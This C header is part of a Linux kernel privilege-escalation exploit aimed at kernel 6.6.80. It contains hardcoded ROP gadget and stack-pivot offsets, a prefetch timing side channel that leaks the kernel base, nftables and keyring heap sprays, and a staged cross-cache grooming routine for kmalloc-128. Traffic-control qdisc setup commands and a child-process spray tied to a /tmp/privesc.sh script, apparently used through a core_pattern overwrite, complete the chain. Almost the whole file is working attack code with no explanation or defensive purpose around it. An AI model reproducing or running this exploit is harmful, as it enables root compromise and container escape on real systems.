#ifndef PWN_PWN_ENV2_H
#define PWN_PWN_ENV2_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/resource.h>
#include <sys/wait.h>

#include <libmnl/libmnl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <libnftnl/table.h>

// Kernel base address
uint64_t g_kernel_base = 0;

// 6.6.80
// Offset for entry_SYSCALL_64_offset
// p &entry_SYSCALL_64
uint64_t g_entry_syscall_off = 0;
uint64_t entry_syscall_off_6 = (0xffffffff82600080 - 0xffffffff81000000);

// kernfs_pr_cont_buf
#define KERNFS_ADDR (0xffffffff84716940 - 0xffffffff81000000 + g_kernel_base)
// ret
#define LEAVE (0xffffffff8157d343 - 0xffffffff81000000 + g_kernel_base)
// qdisc_leaf
#define QDISC_LEAF (0xffffffff81e85fa0 - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff81133edd: pop r12; pop r15; ret;
#define POP2_RET (0xffffffff81133edd - 0xffffffff81000000 + g_kernel_base)
#define POP_RET (POP2_RET + 2)
#define TESTRET (POP_RET + 2)

// 0xffffffff81e51210: push qword ptr [rdi+rdx*2-0x7d]; call qword ptr [rdi];
#define PIVOT_RDI (0xffffffff81e51ac0 - 0xffffffff81000000 + g_kernel_base)

// 0xffffffff81133e4c: mov rsp, rbp; pop rbp; ret;
// #define PIVOT_RBP (0xffffffff81133e4c - 0xffffffff81000000 + g_kernel_base)

// 0xffffffff8117fab8: mov rsp, rbp; pop rbp; pop r15; pop r13; pop r12; jmp 0xffffffff82605280 <__x86_return_thunk>;
#define PIVOT_RBP (0xffffffff8117fab8 - 0xffffffff81000000 + g_kernel_base)
#define POP_RSP (0xffffffff8224859b - 0xffffffff81000000 + g_kernel_base)

#define QDISC_RESET (0xffffffff81e83860 - 0xffffffff81000000 + g_kernel_base)

// 0xffffffff82146de8 : pop rax ; sub byte ptr [rcx + 0x2b], al ; pop rsp ; and al, 0x18 ; jmp 0xffffffff82146df3
#define POP_POP (0xffffffff82146de8 - 0xffffffff81000000 + g_kernel_base)

#define POP_RDI (0xffffffff821f1a4d - 0xffffffff81000000 + g_kernel_base)
#define POP_RSI (0xffffffff8223c6f0 - 0xffffffff81000000 + g_kernel_base)
#define POP_RDX (0xffffffff81d88e32 - 0xffffffff81000000 + g_kernel_base)
// _copy_from_user
// #define COPY_FROM_USER (0xffffffff8187db00 - 0xffffffff81000000 + g_kernel_base)
#define STRCPY (0xffffffff821bc6f0 - 0xffffffff81000000 + g_kernel_base)
#define MSLEEP (0xffffffff81232f10 - 0xffffffff81000000 + g_kernel_base)
// __udelay
#define UDELAY (0xffffffff821c7830 - 0xffffffff81000000 + g_kernel_base)
#define CORE_PATTERN (0xffffffff83bbace0 - 0xffffffff81000000 + g_kernel_base)

// 0xffffffff8117fabd: pop rdi; pop r13; pop r12; jmp 0xffffffff82605280 <__x86_return_thunk>;
#define POP_RDI_RXX_RXX (0xffffffff8117fabd - 0xffffffff81000000 + g_kernel_base)

// add stuff
// 0xffffffff82266bd3: pop r14; jmp 0xffffffff82605280 <__x86_return_thunk>;
// #define POP_R14 (0xffffffff82266bd3 - 0xffffffff81000000 + g_kernel_base)
// #define ADD_RSI_R14 (0xffffffff81016d3b - 0xffffffff81000000 + g_kernel_base)
#define JMP_RAX (0xffffffff821f5fbe - 0xffffffff81000000 + g_kernel_base)
#define POP_RAX (0xffffffff8223f9a5 - 0xffffffff81000000 + g_kernel_base)
#define POP_RBP (0xffffffff81b9ea0f - 0xffffffff81000000 + g_kernel_base)
// #define PUSH_RAX (0xffffffff82246bc8 - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff8111f4de: mov rsi, rax; mov [rbx], rsi; pop rbx; jmp 0xffffffff82605280 <__x86_return_thunk>;
#define MOV_RSI_RAX_MOV_POP_RXX (0xffffffff8111f4de - 0xffffffff81000000 + g_kernel_base)
// 0xffffffff8151860b: add rax, rbp; mov esi, 0x89ffffdd; ret;
#define ADD_RAX_RBP (0xffffffff8151860b - 0xffffffff81000000 + g_kernel_base)

// Pin our process (and children from system() / fork()) to core-0
void pin_to_core_0()
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);

    if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
    {
        perror("sched_setaffinity");
        exit(-1);
    }
}

#define PIPE_MAX 32
#define PIPE_READ 0
#define PIPE_WRITE 1

// An array to hold pipe fds
int g_pipes_arr[PIPE_MAX][2];

// Allocate pipes
void allocate_pipes(void)
{
    for (int i = 0; i < PIPE_MAX; i++)
    {
        if (pipe(g_pipes_arr[i]) == -1)
        {
            perror("pipe");
            exit(-1);
        }
    }
}

// Attempt to reclaim our page by allocating pages to back the pipes
void reclaim_page(void)
{
    char write_buf[4096] = {0};
    memset(&write_buf[0], 'B', 4096);

    for (int i = 0; i < PIPE_MAX; i++)
    {
        write(g_pipes_arr[i][PIPE_WRITE], write_buf, 4096);
    }
}

#define NUM_SPRAY_OBJS 4096UL
#define USERDATA_SIZE 128UL
#define MNL_BUF_SIZE 4096UL

// Global for user data, set once
char g_userdata[USERDATA_SIZE];

// Creates a single nftables table to spray userdata
void create_table(const char *table_name)
{
    if (!table_name)
    {
        fprintf(stderr, "Error: Table name is NULL\n");
        return;
    }

    struct mnl_socket *mnl_sock;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_BUF_SIZE];

    // Open Netlink socket
    mnl_sock = mnl_socket_open(NETLINK_NETFILTER);
    if (!mnl_sock)
    {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    // Connect to Netlink
    if (mnl_socket_bind(mnl_sock, 0, MNL_SOCKET_AUTOPID) < 0)
    {
        perror("mnl_socket_bind");
        mnl_socket_close(mnl_sock);
        exit(EXIT_FAILURE);
    }

    // Initialize Netlink batch (one message per batch)
    memset(buf, 0, sizeof(buf));
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    int seq = 0;
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nftnl_table *table = nftnl_table_alloc();
    if (!table)
    {
        perror("nftnl_table_alloc");
        mnl_socket_close(mnl_sock);
        return;
    }

    // Set table attributes
    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, NFPROTO_INET);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    // Set 128-byte userdata
    nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, g_userdata, USERDATA_SIZE);

    // Build Netlink message
    struct nlmsghdr *msg_hdr = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE,
        NFPROTO_INET,
        NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
        seq++);

    // Attach table payload
    nftnl_table_nlmsg_build_payload(msg_hdr, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    // End batch (one message only)
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // Send the batch (one message per batch)
    if (mnl_socket_sendto(mnl_sock, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("mnl_socket_sendto");
        mnl_socket_close(mnl_sock);
        return;
    }

    ssize_t recv_len = mnl_socket_recvfrom(mnl_sock, buf, sizeof(buf));
    if (recv_len < 0)
    {
        perror("mnl_socket_recvfrom");
    }
    else
    {
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        if (nlh->nlmsg_type == NLMSG_ERROR)
        {
            struct nlmsgerr *err = (struct nlmsgerr *)mnl_nlmsg_get_payload(nlh);
            if (err->error)
            {
                fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
            }
        }
    }

    // Cleanup
    mnl_nlmsg_batch_stop(batch);
    mnl_socket_close(mnl_sock);
}

// Deletes a single nftables table
void delete_table(const char *table_name)
{
    if (!table_name)
    {
        fprintf(stderr, "Error: Table name is NULL\n");
        return;
    }

    struct mnl_socket *mnl_sock;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_BUF_SIZE];

    // Open Netlink socket
    mnl_sock = mnl_socket_open(NETLINK_NETFILTER);
    if (!mnl_sock)
    {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    // Connect to Netlink
    if (mnl_socket_bind(mnl_sock, 0, MNL_SOCKET_AUTOPID) < 0)
    {
        perror("mnl_socket_bind");
        mnl_socket_close(mnl_sock);
        exit(EXIT_FAILURE);
    }

    // Initialize Netlink batch
    memset(buf, 0, sizeof(buf));
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    int seq = 0;
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nftnl_table *table = nftnl_table_alloc();
    if (!table)
    {
        perror("nftnl_table_alloc");
        mnl_socket_close(mnl_sock);
        return;
    }

    // Set table attributes
    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, NFPROTO_INET);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    // Build Netlink message for table deletion
    struct nlmsghdr *msg_hdr = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELTABLE,
        NFPROTO_INET,
        NLM_F_ACK,
        seq++);

    // Attach table payload
    nftnl_table_nlmsg_build_payload(msg_hdr, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    // End batch
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // Send the batch
    if (mnl_socket_sendto(mnl_sock, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("mnl_socket_sendto");
        mnl_socket_close(mnl_sock);
        return;
    }

    ssize_t recv_len = mnl_socket_recvfrom(mnl_sock, buf, sizeof(buf));
    if (recv_len < 0)
    {
        perror("mnl_socket_recvfrom");
    }
    else
    {
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        if (nlh->nlmsg_type == NLMSG_ERROR)
        {
            struct nlmsgerr *err = (struct nlmsgerr *)mnl_nlmsg_get_payload(nlh);
            if (err->error)
            {
                fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
                printf("Table name was: %s\n", table_name);
            }
        }
    }

    // Cleanup
    mnl_nlmsg_batch_stop(batch);
    mnl_socket_close(mnl_sock);
}

void spray_tables(void)
{
    for (size_t i = 0; i < NUM_SPRAY_OBJS; i++)
    {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i);
        create_table(table_name);
    }
}

// Try to use entry bleed to leak the kernel base
#define KERNEL_LOWER_BOUND 0xffffffff80000000ULL
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ULL

uint64_t sidechannel(uint64_t addr)
{
    uint64_t a, b, c, d;
    asm volatile(".intel_syntax noprefix;"
                 "mfence;"
                 "rdtscp;"
                 "mov %0, rax;"
                 "mov %1, rdx;"
                 "xor rax, rax;"
                 "lfence;"
                 "prefetchnta qword ptr [%4];"
                 "prefetcht2 qword ptr [%4];"
                 "xor rax, rax;"
                 "lfence;"
                 "rdtscp;"
                 "mov %2, rax;"
                 "mov %3, rdx;"
                 "mfence;"
                 ".att_syntax;"
                 : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
                 : "r"(addr)
                 : "rax", "rbx", "rcx", "rdx");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

#define STEP 0x100000ull
#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (KERNEL_UPPER_BOUND - KERNEL_LOWER_BOUND) / STEP

uint64_t leak_syscall_entry(uint64_t scan_start, uint64_t scan_end)
{
    (void)scan_end;
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
        {
            uint64_t test = scan_start + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (size_t i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = scan_start + i * STEP;
        }
    }

    return addr;
}

// Setup our class/qdisc hierarchy
void setup_classes(void)
{
    // Create root qdisc
    printf("[>] Creating root qdisc...\n");
    system("./tc.bin qdisc add dev lo root handle 1:0 drr");

    // Create class 1:1
    printf("[>] Creating class 1:1...\n");
    system("./tc.bin class add dev lo classid 1:1 drr");

    // Create class 1:2
    printf("[>] Creating class 1:3...\n");
    system("./tc.bin class add dev lo classid 1:3 drr");

    // Assign plug qdisc to class 1:1
    printf("[>] Assigning plug qdisc to class 1:1...\n");
    system("./tc.bin qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024");

    // Assign pfifo qdisc to class 1:3
    printf("[>] Assigning pfifo qdisc to class 1:3...\n");
    system("./tc.bin qdisc add dev lo parent 1:3 handle 3:0 pfifo");
}

// me stuff
#include <linux/keyctl.h>
typedef int32_t key_serial_t;
// #define KEY_DESC_SIZE (0x400-0x18-1)
#define KEY_DESC_SIZE (0x200 - 0x18 + 1)

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

long keyctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
    return syscall(__NR_keyctl, option, arg2, arg3, arg4, arg5);
}

char key_desc[KEY_DESC_SIZE];
key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size)
{
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        fatal("calloc");

    for (uint32_t i = start; i < start + spray_size; i++)
    {
        // snprintf(key_desc, KEY_DESC_SIZE, "SPRAY-RING-%06d", i);
        key_desc[0] = '\x01' + i; // faster
        id_buffer[i] = add_key("user", key_desc, key_desc, sizeof(key_desc), KEY_SPEC_PROCESS_KEYRING);
        // printk("[~] got id: %u\n", id_buffer[i]);
        // perror("add_key");
        // if (id_buffer[i] < 0)
        //     fatal("add_key");
    }

    return id_buffer;
}

// void realloc_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
//     for (uint32_t i = 0; i < id_buffer_size; i++) {
//         if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0) {
//             fatal("keyctl(KEYCTL_REVOKE)");
//         }
//         key_desc[0] = '\x01' + i; // faster
//         id_buffer[i] = add_key("user", key_desc, key_desc, sizeof(key_desc), KEY_SPEC_PROCESS_KEYRING);
//         if (id_buffer[i] < 0)
//             fatal("add_key");
//     }
// }

// int rewrite_keyring(key_serial_t *id_buffer, uint32_t start, uint32_t cnt) {
//     int32_t keylen = 0;
//     for (uint32_t i = start; i < start + cnt; i++) {
//         // printk("[~] using id: %u\n", id_buffer[i]);
//         keylen = keyctl(KEYCTL_UPDATE, id_buffer[i], (unsigned long)&key_desc, sizeof(key_desc), 0);
//         printf("[~] log rewrite_keyring keylen = %d\n", keylen);
//     }
//     return keylen;
// }

// Cross cache defines
#define OBJS_PER_SLAB 32UL  // Number of objects in a kmalloc-128 page
#define CPU_PARTIAL 30UL    // Number of partial pages for kmalloc-128
#define OVERFLOW_FACTOR 4UL // We want to overkill this

// Cross cache globals
typedef struct cc_bucket
{
    uint64_t min;
    uint64_t max;
} cc_bucket_t;

cc_bucket_t cc1_bucket = {0};
cc_bucket_t cc2_bucket = {0};
cc_bucket_t cc3_bucket = {0};

// Cross-cache stage 1: Spray enough objects that we start getting brand new
// slab allocations in kmalloc-128 and also reserve enough pages that when
// they are placed on the partials list they will evict empty pages
void cc_1(void)
{
    // Calculate the number of objects to spray
    uint64_t spray_amt = (OBJS_PER_SLAB * (CPU_PARTIAL + 1)) * OVERFLOW_FACTOR;

    // Spray the tables
    for (size_t i = 0; i < spray_amt; i++)
    {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i);
        create_table(table_name);
    }

    // Update the bucket
    cc1_bucket.min = 0;
    cc1_bucket.max = spray_amt - 1;
}

// Cross-cache stage 2: Allocate enough objects that we probably land somewhere
// in the middle of a new slab (page) so that our object is probably not the
// exact first or last object on the page
void cc_2(void)
{
    // Calculate the number of objects to spray
    uint64_t spray_amt = OBJS_PER_SLAB - 1;

    // Take into account cc1 when spraying
    uint64_t offset = cc1_bucket.max + 1;
    for (size_t i = 0; i < spray_amt; i++)
    {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i + offset);
        create_table(table_name);
    }

    // Update the bucket
    cc2_bucket.min = offset;
    cc2_bucket.max = offset + spray_amt;
}

// Cross-cache stage 3: Allocate enough objects to complete the victim slab and
// probably go over onto a new brand new slab
void cc_3(void)
{
    // Calculate the number of objects to spray
    uint64_t spray_amt = OBJS_PER_SLAB + 2; // Extra one here for class 1:1?

    // Take into account cc2 when spraying
    uint64_t offset = cc2_bucket.max;
    for (size_t i = 0; i < spray_amt; i++)
    {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%ld", i + offset);
        create_table(table_name);
    }

    // Update the bucket
    cc3_bucket.min = offset;
    cc3_bucket.max = offset + spray_amt;
}

// Free all of the objects we allocated in steps 2 and 3. This will place these
// pages on the kmalloc-128 partials list
void cc_4(void)
{
    // Calculate the id to start with and the amt to free
    uint64_t start = cc2_bucket.min;
    uint64_t free_amt = cc3_bucket.max - start;

    for (size_t i = 0; i < free_amt; i++)
    {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%ld", i + start);
        delete_table(table_name);
    }
}

// Free an object on each of the pages that we allocated in step 1. This will
// place all of these pages onto the partials list and evict our empty page
void cc_5(void)
{
    // Pick the first object to free
    uint64_t start = cc1_bucket.min;

    // Establish the max free object
    uint64_t max = cc1_bucket.max;

    // Free one object per page
    for (size_t i = start; i < max; i += OBJS_PER_SLAB)
    {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i);
        delete_table(table_name);
    }
}

char *required_files[] = {
    "tc.bin",
    "ip.bin",
    "socat.bin",
    "iptables.bin"};

size_t num_files = 3;

int get_kernel_version(void)
{
    struct utsname buffer;

    if (uname(&buffer) != 0)
    {
        perror("uname");
        exit(-1);
    }

    int major_version = 0;
    sscanf(buffer.release, "%d", &major_version);

    return major_version;
}

// Fake class data
uint8_t g_class[128] = {0};

// Fake qdisc data
uint8_t g_qdisc[4096] = {0};

#define BUFFER_SIZE 1024

// What children do
void child_func()
{
    // Open the privesc script
    int fd = open("/tmp/privesc.sh", O_RDONLY);
    dup2(fd, 666);
    // if (fd != 3) {
    //     printf("Got the wrong fd for privesc.sh\n");
    //     exit(-1);
    // }

    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;

    // Block until there's data to read from stdin
    while ((bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer))) > 0)
    {
        write(STDOUT_FILENO, buffer, bytes_read);
    }

    // Handle possible read errors
    if (bytes_read < 0)
    {
        perror("read");
        exit(EXIT_FAILURE);
    }

    // Exit
    exit(0);
}

// How many child processes we spawn
#define NUM_CHILDS 500UL

// Spray children processes so we have a predictable pid in the container
void spray_children(void)
{
    for (size_t i = 0; i < NUM_CHILDS; i++)
    {
        int pid = fork();
        if (pid < 0)
        {
            perror("fork");
            exit(-1);
        }

        // Child
        if (pid == 0)
        {
            child_func();
        }
        else
        {
            printf("[~] pid: %d\n", pid);
        }
    }
}

#endif